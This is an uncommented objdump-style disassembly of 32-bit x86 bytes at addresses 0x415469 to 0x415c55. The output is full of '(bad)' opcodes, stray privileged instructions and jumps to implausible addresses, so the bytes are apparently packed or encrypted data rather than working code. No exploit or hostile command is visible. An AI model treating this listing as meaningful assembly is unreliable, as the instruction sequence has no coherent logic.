  415469:	rcr    edi,cl
  41546b:	fwait
  41546c:	sbb    DWORD PTR [edx*8-0x6fc71bb8],edi
  415473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415474:	scas   eax,DWORD PTR es:[edi]
  415475:	test   al,0xee
  415477:	aaa    
  415478:	jp     0x4154dd
  41547a:	mov    edi,0x2bea6d28
  41547f:	dec    ebp
  415480:	pusha  
  415481:	mov    al,ds:0x940a3873
  415486:	xchg   ebp,eax
  415487:	nop
  415488:	sbb    al,BYTE PTR [esp+eax*1+0x57afd18c]
  41548f:	popa   
  415490:	or     al,0x1f
  415492:	cmp    BYTE PTR [ebx],dl
  415494:	dec    esp
  415495:	fwait
  415496:	(bad)  
  415497:	push   cs
  415498:	lock jae 0x415448
  41549b:	mov    edx,0x23165618
  4154a0:	push   es
  4154a1:	out    0x7b,al
  4154a3:	inc    ecx
  4154a4:	xchg   ebx,eax
  4154a5:	(bad)  
  4154a6:	sub    eax,DWORD PTR [edi+0x47]
  4154a9:	pop    ss
  4154aa:	js     0x4154bd
  4154ac:	mov    bl,0xae
  4154ae:	stc    
  4154af:	fucomp st(2)
  4154b1:	jbe    0x4154c1
  4154b3:	jmp    0x415443
  4154b5:	push   esi
  4154b6:	imul   edx,DWORD PTR [esi+0x4f4573d3],0xd48b62f5
  4154c0:	pop    es
  4154c1:	sub    eax,0x8afdeeb0
  4154c6:	mov    ah,0x82
  4154c8:	stc    
  4154c9:	sub    eax,DWORD PTR [edx-0x78]
  4154cc:	aas    
  4154cd:	sbb    al,0xdd
  4154cf:	daa    
  4154d0:	cld    
  4154d1:	inc    BYTE PTR [ebp-0x8]
  4154d4:	neg    BYTE PTR [ebp-0x3cd61468]
  4154da:	ins    BYTE PTR es:[edi],dx
  4154db:	add    al,0x40
  4154dd:	or     DWORD PTR [esi+0x4150ac04],0x7f
  4154e4:	sub    al,0x12
  4154e6:	std    
  4154e7:	mov    bh,BYTE PTR [ebp-0x7b]
  4154ea:	test   DWORD PTR [ebp+0xf],ebp
  4154ed:	imul   esi,DWORD PTR [edi],0xffffff94
  4154f0:	popf   
  4154f1:	ror    DWORD PTR [edi-0x16a2a213],1
  4154f7:	nop
  4154f8:	(bad)
  4154fd:	arpl   bp,di
  4154ff:	jl     0x4154b8
  415501:	cld    
  415502:	sbb    cl,BYTE PTR [eax+0x28]
  415505:	mov    eax,DWORD PTR [ecx-0x1a]
  415508:	addr16 push eax
  41550a:	out    dx,eax
  41550b:	repnz cdq 
  41550d:	into   
  41550e:	add    ebx,edx
  415510:	int3   
  415511:	adc    al,0x4f
  415513:	cs div ecx
  415516:	sbb    BYTE PTR [eax-0x61],al
  415519:	xor    DWORD PTR [edi+ebp*4-0x51],edx
  41551d:	xor    ah,BYTE PTR [ecx]
  41551f:	ss stc 
  415521:	and    DWORD PTR [eax],0xda803609
  415527:	fwait
  415528:	out    dx,al
  415529:	mov    edi,0x7ba1c905
  41552e:	inc    ecx
  41552f:	xor    DWORD PTR [esi],ebx
  415531:	into   
  415532:	test   eax,0xce24334b
  415537:	or     eax,0xc607d366
  41553c:	dec    ecx
  41553d:	imul   ebp,DWORD PTR [ecx+0x7dd55fe8],0x355a700d
  415547:	adc    al,0xfc
  41554a:	enter  0xef0b,0xf0
  41554e:	fisub  DWORD PTR [eax-0x4c8ca53c]
  415554:	aam    0x1
  415556:	div    DWORD PTR [ebp+0x9]
  415559:	and    al,0xe8
  41555b:	imul   esp,DWORD PTR [esi+ecx*1+0x67c80af5],0x44
  415563:	jne    0x4155cb
  415565:	rcr    DWORD PTR ds:0x412c2300,cl
  41556b:	adc    eax,0x6e69cdd
  415570:	cli    
  415571:	out    dx,eax
  415572:	pop    ss
  415573:	jge    0x415598
  415575:	mov    ch,0x25
  415577:	scas   eax,DWORD PTR es:[edi]
  415578:	scas   al,BYTE PTR es:[edi]
  415579:	shr    BYTE PTR [esp+ebp*4],cl
  41557c:	cmp    ebx,DWORD PTR [edx+0x612e8cc4]
  415582:	cmp    ch,BYTE PTR [esi-0x6c67cdac]
  415588:	(bad)  
  41558a:	inc    edx
  41558b:	shl    edi,cl
  41558d:	iret   
  41558e:	scas   eax,DWORD PTR es:[edi]
  41558f:	jge    0x4155f7
  415591:	movnti DWORD PTR [ecx+ecx*2],eax
  415595:	daa    
  415596:	dec    edi
  415597:	sar    DWORD PTR [edx],1
  415599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41559a:	inc    eax
  41559b:	in     al,dx
  41559c:	aaa    
  41559d:	sbb    DWORD PTR [eax-0x2d],ecx
  4155a0:	sbb    eax,0x72908a20
  4155a5:	iret   
  4155a6:	sub    bh,BYTE PTR [esi-0x542f601c]
  4155ac:	dec    edi
  4155ad:	(bad)  
  4155ae:	or     DWORD PTR [eax],edx
  4155b0:	push   ss
  4155b1:	sbb    ch,BYTE PTR [ebx+0x5d]
  4155b4:	push   ecx
  4155b5:	lock fdivr QWORD PTR ds:0xe00327aa
  4155bc:	mov    bh,dl
  4155be:	dec    eax
  4155bf:	mov    BYTE PTR [esi],cl
  4155c1:	retf   0x9467
  4155c4:	retf   
  4155c5:	sti    
  4155c6:	pushf  
  4155c7:	sbb    BYTE PTR ds:0x83d3885a,bl
  4155cd:	mov    edi,0x9f2a05b8
  4155d2:	dec    eax
  4155d3:	pop    esp
  4155d4:	inc    edi
  4155d5:	mov    ds:0x56208af1,eax
  4155da:	sub    cl,BYTE PTR [ecx]
  4155dc:	daa    
  4155dd:	dec    ebp
  4155de:	xchg   DWORD PTR [bp+di],esp
  4155e1:	std    
  4155e2:	rcr    BYTE PTR [esi+0x17],0x5a
  4155e6:	neg    edx
  4155e8:	push   cs
  4155e9:	retf   0x9f2e
  4155ec:	std    
  4155ed:	aaa    
  4155ee:	push   esp
  4155ef:	idiv   ebp
  4155f1:	push   ecx
  4155f2:	gs xchg esp,eax
  4155f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155f5:	das    
  4155f6:	xchg   esp,eax
  4155f7:	test   al,0x86
  4155f9:	fistp  WORD PTR [eax]
  4155fb:	jmp    0xd75940e2
  415600:	sbb    edi,DWORD PTR [eax+0x3e715742]
  415606:	jl     0x4155db
  415608:	push   cs
  415609:	or     eax,0x1106821f
  41560e:	mov    al,ds:0xb16f4beb
  415613:	sub    esi,DWORD PTR [ecx]
  415615:	jns    0x415660
  415617:	stc    
  415618:	add    ebp,edi
  41561a:	sub    DWORD PTR [edi-0x5a],ebp
  41561d:	pop    edi
  41561e:	imul   esi,DWORD PTR [ecx+0x1ccadd69],0xeabfad54
  415628:	imul   ecx,esi,0x5ca68707
  41562e:	aas    
  41562f:	or     al,0x91
  415631:	loopne 0x4155ef
  415633:	arpl   WORD PTR ds:0x7cadee08,bp
  415639:	inc    ecx
  41563a:	xor    eax,0x20439c42
  41563f:	fistp  QWORD PTR [edx+0x5db8c066]
  415645:	jns    0x4156b0
  415647:	pop    ecx
  415648:	fst    QWORD PTR fs:[esp+edx*8+0x2]
  41564d:	mov    ebp,0xe2deaf92
  415652:	xor    DWORD PTR [esi],0x10
  415655:	call   0xca22d846
  41565a:	mov    cl,0xcf
  41565c:	lea    eax,[esi+ebp*1-0x1]
  415660:	jl     0x4156df
  415662:	lds    eax,FWORD PTR fs:[esi-0xcc9bb9c]
  415669:	popa   
  41566a:	cmp    edx,DWORD PTR [ecx]
  41566c:	sbb    DWORD PTR [ebp-0x40b15291],esp
  415672:	sub    eax,ebx
  415674:	push   es
  415675:	cdq    
  415676:	jns    0x41561c
  415678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415679:	test   al,0xe7
  41567b:	ret    0xbc89
  41567e:	jmp    0xd141d096
  415683:	rol    DWORD PTR [esi-0x7],1
  415686:	mov    eax,ds:0x2adb45fc
  41568b:	ja     0x4156c3
  41568d:	xchg   edx,eax
  41568e:	inc    ebx
  41568f:	pop    edi
  415690:	mov    eax,ds:0x5653588f
  415695:	div    BYTE PTR [eax]
  415697:	mov    ecx,0xf6fe1786
  41569c:	mov    esi,0xcc50821a
  4156a1:	mov    ebp,0xbd9c208f
  4156a6:	out    dx,eax
  4156a7:	jp     0x41563b
  4156a9:	hlt    
  4156aa:	mov    esp,DWORD PTR [edx]
  4156ac:	arpl   WORD PTR [esi],di
  4156ae:	inc    ebp
  4156af:	dec    eax
  4156b0:	std    
  4156b1:	cli    
  4156b2:	push   ds
  4156b3:	ds aaa 
  4156b5:	pushf  
  4156b6:	jg     0x415723
  4156b8:	xchg   BYTE PTR ds:0xb4016cfa,bh
  4156be:	sbb    BYTE PTR [edx+0x6e],al
  4156c1:	iret   
  4156c2:	xchg   edx,eax
  4156c3:	xor    DWORD PTR [esp+esi*4+0x76],esi
  4156c7:	ror    BYTE PTR [esi+0x6dfaa1f6],0xf4
  4156ce:	pop    ss
  4156cf:	rcl    DWORD PTR [eax],0x31
  4156d2:	es fwait
  4156d4:	rcl    BYTE PTR [ebx+edi*4+0x589e9299],0xde
  4156dc:	icebp  
  4156dd:	xchg   ecx,eax
  4156de:	or     DWORD PTR [eax+0x3b],ecx
  4156e1:	sbb    eax,0x5dc77246
  4156e6:	fst    DWORD PTR [ecx-0x7f5977b3]
  4156ec:	add    edx,DWORD PTR [eax+0x6]
  4156ef:	lods   al,BYTE PTR ds:[esi]
  4156f0:	cmp    BYTE PTR [ebp-0x59e1ca2],ah
  4156f6:	stos   BYTE PTR es:[edi],al
  4156f7:	push   edi
  4156f8:	sub    DWORD PTR [esi+0x41c08fd2],esp
  4156fe:	push   esi
  4156ff:	dec    esp
  415700:	sahf   
  415701:	adc    esi,eax
  415703:	jbe    0x4156f1
  415705:	push   ecx
  415706:	dec    edi
  415707:	sub    BYTE PTR [ebp-0x1594ef3f],ah
  41570d:	outs   dx,BYTE PTR ds:[esi]
  41570e:	xchg   esp,eax
  41570f:	pop    esi
  415710:	rcr    al,0xd6
  415713:	cmp    ah,BYTE PTR [ecx]
  415715:	xor    cl,BYTE PTR [ebx-0x3d]
  415718:	push   ebx
  415719:	jmp    0x415775
  41571b:	and    ecx,DWORD PTR [esi]
  41571d:	(bad)  
  41571e:	cmp    eax,0xcf5ce7dd
  415723:	and    al,0x93
  415725:	add    bl,cl
  415727:	std    
  415728:	loope  0x4157a4
  41572a:	xor    eax,0xb253fe78
  41572f:	mov    eax,ds:0x2300417e
  415734:	xor    eax,0x47e800d3
  415739:	jne    0x41579f
  41573b:	aaa    
  41573c:	cmp    eax,DWORD PTR [edx-0x74]
  41573f:	jmp    0xa1ef1e78
  415744:	add    eax,0x36c95e90
  415749:	mov    ecx,0x4bdaae09
  41574e:	or     DWORD PTR [ecx+0xb],0x72
  415752:	inc    ebx
  415753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415754:	jmp    0x415766
  415756:	fdiv   st(3),st
  415758:	out    dx,al
  415759:	push   edx
  41575a:	(bad)  
  41575b:	in     eax,dx
  41575c:	mov    cl,0x4a
  41575e:	mov    ss,WORD PTR [esi-0x36]
  415761:	test   ch,ch
  415763:	dec    esp
  415764:	aad    0x42
  415766:	and    DWORD PTR [esi],0x8987d0dc
  41576c:	jmp    FWORD PTR [edi-0x593e336e]
  415772:	retf   0xff3
  415775:	inc    eax
  415776:	sub    DWORD PTR [ecx-0x51],esi
  415779:	cld    
  41577a:	mov    al,ch
  41577c:	dec    edi
  41577d:	sbb    bl,BYTE PTR [edx]
  41577f:	stos   DWORD PTR es:[edi],eax
  415780:	ds push 0x27
  415783:	ja     0x4157e4
  415785:	mov    dh,0x76
  415787:	and    DWORD PTR ds:0xb3d1e9bb,edi
  41578d:	sub    DWORD PTR [ebp-0x64],esi
  415790:	bound  edi,QWORD PTR [esi]
  415792:	xchg   esi,eax
  415793:	dec    esi
  415794:	pushf  
  415795:	rcl    DWORD PTR [eax+0x4d7781bb],1
  41579b:	pop    esi
  41579c:	popa   
  41579d:	mov    ds:0x7cf3ee42,eax
  4157a2:	mov    WORD PTR [edx+0x66e88bc5],gs
  4157a8:	cmc    
  4157a9:	mov    esi,0x95e154e2
  4157ae:	pop    ss
  4157af:	(bad)  
  4157b1:	scas   eax,DWORD PTR es:[edi]
  4157b2:	cmove  ebp,DWORD PTR [ebp-0x4fe57a98]
  4157b9:	or     al,0xe2
  4157bb:	pushf  
  4157bc:	jl     0x4157c1
  4157be:	and    eax,0x5c4518ee
  4157c3:	xchg   ecx,eax
  4157c4:	sub    al,0x5f
  4157c6:	fdiv   DWORD PTR [esi]
  4157c8:	lds    ebx,FWORD PTR [ebx+0x4e261a86]
  4157ce:	dec    esp
  4157cf:	xchg   ebp,eax
  4157d0:	xlat   BYTE PTR ds:[ebx]
  4157d1:	mov    eax,0x4cf0d8ff
  4157d6:	test   DWORD PTR [ecx-0x771f284a],0xd92cb30b
  4157e0:	and    DWORD PTR [eax],0xffffff93
  4157e3:	cmp    dl,BYTE PTR [ecx+0x13b86492]
  4157e9:	fs loop 0x415846
  4157ec:	xor    al,0x92
  4157ee:	jmp    0xb7d0432b
  4157f3:	cmp    bh,BYTE PTR [ebx+esi*8-0x5fce1960]
  4157fa:	daa    
  4157fb:	(bad)  
  4157fc:	sub    esp,edx
  4157fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ff:	mov    esi,0xe4ddc7f7
  415804:	stc    
  415805:	jmp    0x6005cb34
  41580a:	rcl    BYTE PTR [esi],0x65
  41580d:	pop    es
  41580e:	addr16 repz test al,0xb0
  415812:	je     0x415818
  415814:	ror    dh,0xbf
  415817:	cli    
  415818:	jl     0x415869
  41581a:	push   edx
  41581b:	fld    QWORD PTR [ebp-0xfc6987a]
  415821:	(bad)  
  415822:	sti    
  415823:	(bad)  
  415824:	dec    ebp
  415825:	hlt    
  415826:	push   ss
  415827:	lds    ebp,FWORD PTR [ebx]
  415829:	ins    BYTE PTR es:[edi],dx
  41582a:	xor    cl,BYTE PTR [eax+0x74eae7fe]
  415830:	jg     0x415855
  415832:	test   bh,bl
  415834:	sbb    al,0xdb
  415836:	pop    ecx
  415837:	data16 jno 0x4157c6
  41583a:	jns    0x41581e
  41583c:	push   ds
  41583d:	push   ecx
  41583e:	jmp    0x5bbe:0x6ec4b6b1
  415845:	or     al,0x8a
  415847:	mov    edx,0x167e9d6a
  41584c:	push   ebx
  41584d:	outs   dx,DWORD PTR ds:[esi]
  41584e:	or     BYTE PTR [esi-0x52],bh
  415851:	adc    al,0xac
  415853:	cmp    al,0x5f
  415855:	ins    BYTE PTR es:[edi],dx
  415856:	mov    ds:0xd4d94c30,al
  41585b:	fldenv [eax+0x35]
  41585e:	jns    0x415825
  415860:	ds pop eax
  415862:	xor    edi,DWORD PTR [ecx+0x3ceb3d36]
  415868:	je     0x415892
  41586a:	out    0xfd,eax
  41586c:	loop   0x415828
  41586e:	cmp    DWORD PTR [ebp+0x22],ecx
  415871:	out    0x7,al
  415873:	xor    al,0x65
  415875:	mov    ds:0x693ca63f,al
  41587a:	sub    ch,BYTE PTR [ebp-0x37]
  41587d:	pop    ebx
  41587e:	lock popa 
  415880:	mov    ch,0x74
  415882:	xor    edi,DWORD PTR [edi-0x592ef077]
  415888:	mov    eax,0xfa2a73fb
  41588d:	xchg   edx,eax
  41588e:	inc    edx
  41588f:	lods   al,BYTE PTR ds:[esi]
  415890:	pop    edx
  415891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415892:	xchg   edi,eax
  415893:	aaa    
  415894:	rol    BYTE PTR [esi],1
  415896:	aaa    
  415897:	sub    eax,0x65dbf249
  41589c:	mov    dl,0x3d
  41589e:	mov    DWORD PTR [edi+edx*8-0x1a],esp
  4158a2:	fwait
  4158a3:	enter  0x4b7e,0xe5
  4158a7:	and    BYTE PTR [eax+0x569ce567],ch
  4158ad:	jl     0x415894
  4158af:	mov    cl,0xff
  4158b1:	ret    
  4158b2:	push   es
  4158b3:	fwait
  4158b4:	and    DWORD PTR [ecx],eax
  4158b6:	int3   
  4158b7:	xor    al,0x99
  4158b9:	add    BYTE PTR [ecx-0x7cb7b248],ch
  4158bf:	sbb    ah,BYTE PTR [edi+0x3b]
  4158c2:	mov    al,0x1
  4158c4:	test   eax,esp
  4158c6:	push   0xffffff96
  4158c8:	sbb    ah,BYTE PTR [esi]
  4158ca:	fxch   st(6)
  4158cc:	popa   
  4158cd:	add    BYTE PTR [eax*8+0x124ed40c],dl
  4158d4:	inc    esi
  4158d5:	jne    0x415887
  4158d7:	jnp    0x41589d
  4158d9:	repnz or esi,ecx
  4158dc:	popf   
  4158dd:	mov    eax,0xc89215db
  4158e2:	shl    DWORD PTR [edi+0x57d537f5],0xb3
  4158e9:	jge    0x41586b
  4158eb:	jl     0x41591c
  4158ed:	or     al,0xe2
  4158ef:	mov    ah,0x80
  4158f1:	jbe    0x41594b
  4158f3:	inc    ebp
  4158f4:	push   eax
  4158f5:	jo     0x415909
  4158f7:	push   ss
  4158f8:	fadd   QWORD PTR [ebp+0x12fc690c]
  4158fe:	jp     0x41597a
  415900:	pop    edi
  415901:	add    DWORD PTR [ebp-0x2c6ca2eb],0x61
  415908:	and    edi,DWORD PTR [edi]
  41590a:	ror    BYTE PTR [edi-0x6724040d],0x47
  415911:	jns    0x415944
  415913:	jne    0x415911
  415915:	fnstenv [ecx-0x31e82849]
  41591b:	out    dx,eax
  41591c:	(bad)
  41591f:	xchg   esp,eax
  415920:	dec    edx
  415921:	mov    ecx,0x671498c4
  415926:	push   esp
  415927:	std    
  415928:	in     eax,dx
  415929:	dec    esp
  41592a:	jg     0x415924
  41592c:	push   ebp
  41592d:	fnsave ds:0xd8245ba0
  415933:	lock and al,0xba
  415936:	icebp  
  415937:	clc    
  415938:	xor    DWORD PTR [edi-0x798bda4f],esi
  41593e:	jne    0x4159b5
  415940:	adc    eax,DWORD PTR [esi-0x38]
  415943:	mov    eax,ds:0x564687b9
  415948:	mov    bh,0xe3
  41594a:	jnp    0x415945
  41594c:	push   esp
  41594d:	inc    edi
  41594e:	cdq    
  41594f:	add    ah,al
  415951:	jno    0x4159b4
  415953:	shl    DWORD PTR [ebp+0x39],1
  415956:	inc    eax
  415957:	mov    bl,0x5e
  415959:	add    dl,BYTE PTR [edx]
  41595b:	push   ecx
  41595c:	mov    bl,0x9e
  41595e:	xchg   esp,eax
  41595f:	aas    
  415960:	and    al,0xbd
  415962:	jecxz  0x415918
  415964:	enter  0x4cb4,0xf0
  415968:	jle    0x415991
  41596a:	sub    eax,0x405bd37d
  41596f:	cli    
  415970:	or     edi,ecx
  415972:	call   0xd1708dd
  415977:	inc    ebx
  415978:	imul   ebp,DWORD PTR [edx+0x3c],0xce7ccad7
  41597f:	inc    esp
  415980:	cmp    edi,eax
  415982:	test   ch,0xb4
  415985:	dec    edx
  415986:	sti    
  415987:	adc    edx,DWORD PTR [edi+0x4e]
  41598a:	adc    DWORD PTR [edx+0x388900c8],edi
  415990:	pop    ebx
  415991:	sti    
  415992:	add    eax,0x1f3f5d2c
  415997:	iret   
  415998:	inc    ebx
  415999:	adc    ebp,DWORD PTR [edx+0x576c3c64]
  41599f:	pop    edi
  4159a0:	shl    eax,cl
  4159a2:	call   0xe84ebb40
  4159a7:	dec    edi
  4159a8:	sbb    eax,0xf0423bef
  4159ad:	fidiv  WORD PTR ds:0x6646fa2e
  4159b3:	sub    ch,cl
  4159b5:	jp     0x415946
  4159b7:	repnz dec ebp
  4159b9:	std    
  4159ba:	das    
  4159bb:	and    BYTE PTR [ebx-0x67587822],dh
  4159c1:	jmp    0x6fcae857
  4159c6:	pop    es
  4159c7:	xchg   edx,eax
  4159c8:	cmp    DWORD PTR [esi],edi
  4159ca:	push   es
  4159cb:	dec    ecx
  4159cc:	in     eax,0x4a
  4159ce:	push   ds
  4159cf:	sbb    BYTE PTR [eax-0x1c],bh
  4159d2:	(bad)  
  4159d3:	daa    
  4159d4:	clc    
  4159d5:	cmc    
  4159d6:	daa    
  4159d7:	call   0x63e25b3f
  4159dc:	cmp    eax,0x10b86a89
  4159e1:	dec    eax
  4159e2:	sti    
  4159e3:	pop    ds
  4159e4:	mov    ebx,0xa60cc510
  4159e9:	and    ebp,edx
  4159eb:	adc    BYTE PTR [edi+eax*1],al
  4159ee:	std    
  4159ef:	in     al,dx
  4159f0:	jmp    0x415978
  4159f2:	inc    eax
  4159f3:	aam    0xa9
  4159f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159f6:	bound  eax,QWORD PTR [esi]
  4159f8:	pop    ds
  4159f9:	cmp    eax,0x85a63f7f
  4159fe:	mov    al,ds:0x348b0a74
  415a03:	add    DWORD PTR [edi-0x15f87601],ebp
  415a09:	ins    DWORD PTR es:[edi],dx
  415a0a:	adc    eax,0x4717e6f6
  415a0f:	dec    ebx
  415a10:	mov    al,0x2b
  415a12:	jmp    0x4159f6
  415a14:	jge    0x415a5d
  415a16:	fisub  WORD PTR [ebx+edx*2-0x2]
  415a1a:	stos   BYTE PTR es:[edi],al
  415a1b:	dec    eax
  415a1c:	push   ebx
  415a1d:	loopne 0x415a23
  415a1f:	pop    ds
  415a20:	pop    edi
  415a21:	fs pop ebp
  415a23:	cmp    al,BYTE PTR [esi+0x14]
  415a26:	dec    esp
  415a27:	jns    0x415a5a
  415a29:	in     eax,0x2c
  415a2b:	mov    BYTE PTR [ebp-0x59],cl
  415a2e:	clc    
  415a2f:	rol    DWORD PTR [ecx],1
  415a31:	push   edi
  415a32:	and    dh,ah
  415a34:	in     al,dx
  415a35:	add    eax,0xc8c0af16
  415a3a:	sub    al,0xf6
  415a3c:	pop    ebx
  415a3d:	fcom   QWORD PTR [ebp-0x13401cd0]
  415a43:	ins    BYTE PTR es:[edi],dx
  415a44:	in     al,0x9
  415a46:	inc    ebp
  415a47:	cmp    DWORD PTR ds:0xbb520eea,edi
  415a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a4e:	and    al,0xb5
  415a50:	xor    DWORD PTR ds:0x37ac7394,0xffffff95
  415a57:	fisubr DWORD PTR [edi+0x769e8139]
  415a5d:	mov    dl,0x76
  415a5f:	call   0xe63b:0x33de8dc9
  415a66:	mov    bh,0xeb
  415a68:	loop   0x415a37
  415a6a:	pop    ss
  415a6b:	push   esi
  415a6c:	imul   esi,DWORD PTR [ecx],0x5623880c
  415a72:	jns    0x415a08
  415a74:	jb     0x415a94
  415a76:	(bad)  
  415a77:	iret   
  415a78:	push   cs
  415a79:	and    eax,0x5ad446d2
  415a7e:	mov    esi,DWORD PTR [edx-0x299788c]
  415a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a85:	inc    BYTE PTR [eax+eax*4-0x39]
  415a89:	jne    0x415a51
  415a8b:	pop    ss
  415a8c:	xor    DWORD PTR [ebx-0x1c],ebx
  415a8f:	out    dx,eax
  415a90:	neg    BYTE PTR [ecx-0x11]
  415a93:	cmp    BYTE PTR ds:0x3d5eea43,cl
  415a99:	lock add al,0x9a
  415a9c:	jae    0x415a7a
  415a9e:	sbb    ebp,DWORD PTR [ebx-0x71]
  415aa1:	iret   
  415aa2:	addr16 jae 0x415a49
  415aa5:	ror    bh,0xb3
  415aa8:	popa   
  415aa9:	outs   dx,BYTE PTR ds:[esi]
  415aaa:	push   cs
  415aab:	js     0x415a85
  415aad:	pop    esp
  415aae:	(bad)  
  415aaf:	mov    BYTE PTR ds:0xf8904ac1,al
  415ab5:	push   DWORD PTR es:0xd9149d89
  415abc:	fiadd  DWORD PTR [edi+0x6987f584]
  415ac2:	(bad)  
  415ac3:	ds pushf 
  415ac5:	outs   dx,BYTE PTR ds:[esi]
  415ac6:	pop    ds
  415ac7:	push   eax
  415ac8:	adc    ebp,DWORD PTR [edx]
  415aca:	fidivr DWORD PTR [esi]
  415acc:	xor    eax,0x3f169e4f
  415ad1:	inc    esi
  415ad2:	loope  0x415a64
  415ad4:	fsub   QWORD PTR [ebp-0x669d7fcf]
  415ada:	fild   QWORD PTR [ebx]
  415adc:	cwde   
  415add:	sub    eax,0xc3ad0035
  415ae2:	mov    ecx,0xb567010
  415ae7:	push   ds
  415ae8:	and    cl,dh
  415aea:	js     0x415b1c
  415aec:	(bad)  
  415aed:	lds    ecx,FWORD PTR [ebx+0x1e46666a]
  415af3:	dec    eax
  415af4:	mov    ebp,0x18ab5ff4
  415af9:	pop    ds
  415afa:	cmp    eax,0xac731e35
  415aff:	fs mov edx,0xcbb3f789
  415b05:	push   ss
  415b06:	shr    BYTE PTR [edi],0x44
  415b09:	ret    0xde48
  415b0c:	out    dx,al
  415b0d:	push   edx
  415b0e:	jmp    0x415adb
  415b10:	mov    ecx,0xbbc2b4f2
  415b15:	outs   dx,BYTE PTR ds:[esi]
  415b16:	mov    eax,0x6802dea6
  415b1b:	dec    ebp
  415b1c:	gs sti 
  415b1e:	icebp  
  415b1f:	aaa    
  415b20:	test   eax,0x74a343
  415b25:	or     DWORD PTR [edi-0x17],edi
  415b28:	mov    dh,BYTE PTR [esp+ebx*8+0x392c24b8]
  415b2f:	sub    edx,DWORD PTR [ebx-0x6]
  415b32:	inc    esp
  415b33:	xchg   ebp,eax
  415b34:	ss dec ebx
  415b36:	rcl    BYTE PTR [esi],1
  415b38:	add    dh,bh
  415b3a:	inc    edi
  415b3b:	pop    edx
  415b3c:	dec    ecx
  415b3d:	or     BYTE PTR [ecx],dl
  415b3f:	test   ah,bh
  415b41:	pop    edi
  415b42:	shl    BYTE PTR [edi-0x2c06dcb8],cl
  415b48:	stc    
  415b49:	jle    0x415bb1
  415b4b:	out    0xd1,al
  415b4d:	rol    bl,1
  415b4f:	ja     0x415b29
  415b51:	dec    edx
  415b52:	in     eax,0xd3
  415b54:	dec    eax
  415b55:	pop    ebx
  415b56:	and    DWORD PTR [edx+0x41ca0cbf],0x25
  415b5d:	dec    esi
  415b5e:	mov    ebx,0x718291c3
  415b63:	lock or eax,0xe37f5952
  415b69:	add    ebp,DWORD PTR [ebp-0x57]
  415b6c:	or     BYTE PTR [eax],dl
  415b6e:	sub    eax,DWORD PTR [ebx-0x6f]
  415b71:	dec    ebp
  415b72:	sti    
  415b73:	add    DWORD PTR [edi+0x182926e3],eax
  415b79:	push   edi
  415b7a:	sti    
  415b7b:	rcl    DWORD PTR [eax+0x1f],1
  415b7e:	js     0x415bce
  415b80:	xor    al,0xf0
  415b82:	sbb    esi,DWORD PTR [edi]
  415b84:	mov    ds:0x753c4d2f,al
  415b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b8a:	jl     0x415b1d
  415b8c:	push   esi
  415b8d:	sti    
  415b8e:	lahf   
  415b8f:	mov    ds:0x44885719,al
  415b94:	inc    esi
  415b95:	mov    BYTE PTR [edx],dh
  415b97:	mov    edx,0xef1c97df
  415b9c:	stos   BYTE PTR es:[edi],al
  415b9d:	in     eax,0x62
  415b9f:	shl    BYTE PTR [edx],1
  415ba1:	push   edx
  415ba2:	rcl    BYTE PTR ss:[ecx],0x9c
  415ba6:	sub    al,0x99
  415ba8:	out    0x71,al
  415baa:	inc    esi
  415bab:	adc    ecx,esp
  415bad:	mov    cl,0xb4
  415baf:	lods   al,BYTE PTR ds:[esi]
  415bb0:	pop    ecx
  415bb1:	mov    ebp,0xa399a8b6
  415bb6:	sti    
  415bb7:	jle    0x415b47
  415bb9:	xchg   ecx,eax
  415bba:	xor    eax,0x37a4bfa0
  415bbf:	push   0xffffffab
  415bc1:	or     cl,bl
  415bc3:	xchg   edi,eax
  415bc4:	inc    edi
  415bc5:	mov    al,0x44
  415bc7:	repnz iret 
  415bc9:	ds jmp 0x27f49f63
  415bcf:	test   edi,edx
  415bd1:	bound  edx,QWORD PTR [edi+0x4cecb8c1]
  415bd7:	inc    edx
  415bd8:	lods   al,BYTE PTR ds:[esi]
  415bd9:	and    edi,esi
  415bdb:	push   0xdd99c2ab
  415be0:	pop    ebp
  415be1:	aaa    
  415be2:	push   esp
  415be3:	pop    esp
  415be4:	sbb    al,0x6f
  415be6:	pop    esi
  415be7:	rcr    BYTE PTR [ecx+ecx*8+0x2c],0xfe
  415bec:	lods   al,BYTE PTR ds:[esi]
  415bed:	rol    DWORD PTR [ecx-0xb],0xef
  415bf1:	pop    edi
  415bf2:	xchg   edi,eax
  415bf3:	(bad)  
  415bf4:	jnp    0x415bda
  415bf6:	js     0x415c3a
  415bf8:	ds inc esp
  415bfa:	and    ebx,DWORD PTR [esi+ebx*8+0x75ba227d]
  415c01:	push   eax
  415c02:	pop    es
  415c03:	cmc    
  415c04:	popf   
  415c05:	jne    0x415b8f
  415c07:	mov    edx,0x9e44db31
  415c0c:	mov    al,ds:0x416ecd8a
  415c11:	idiv   BYTE PTR [eax-0x48]
  415c14:	push   ebx
  415c15:	inc    edx
  415c16:	(bad)  
  415c17:	outs   dx,BYTE PTR ds:[esi]
  415c18:	int3   
  415c19:	inc    edi
  415c1a:	sub    al,0x66
  415c1c:	lock outs dx,DWORD PTR ds:[esi]
  415c1e:	jge    0x415c7f
  415c20:	mov    ds,ebp
  415c22:	inc    ebx
  415c23:	cdq    
  415c24:	out    dx,eax
  415c25:	sub    BYTE PTR [esi*4-0x4cad598],bh
  415c2c:	inc    ebx
  415c2d:	js     0x415bf8
  415c2f:	xchg   BYTE PTR [ebx+eiz*4+0x582395fb],ch
  415c36:	mov    ah,0x5a
  415c38:	int    0xba
  415c3a:	xor    dh,0x14
  415c3d:	mov    BYTE PTR [ebx+esi*2],al
  415c40:	and    eax,0xba21950d
  415c45:	stos   DWORD PTR es:[edi],eax
  415c46:	push   0xffffffe1
  415c48:	out    0x8c,eax
  415c4a:	sbb    eax,0x842927d4
  415c4f:	fist   DWORD PTR [esi+0x78375751]
  415c55:	mov    esi,DWORD PTR [esi]
